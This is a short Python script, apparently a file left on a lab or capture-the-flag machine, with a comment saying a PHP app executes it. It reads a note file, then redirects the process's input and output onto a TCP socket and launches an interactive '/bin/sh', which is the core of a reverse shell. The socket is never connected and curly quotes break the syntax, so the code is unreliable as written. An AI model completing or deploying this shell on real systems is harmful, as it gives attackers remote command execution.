#!/usr/bin/python
import os
import socket
import subprocess
#
# executed from php app add final wrapper/script here
print “waiting on engineers to tweak final code”
os.system(‘cat note.txt’)
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call([“/bin/sh”,”-I”])
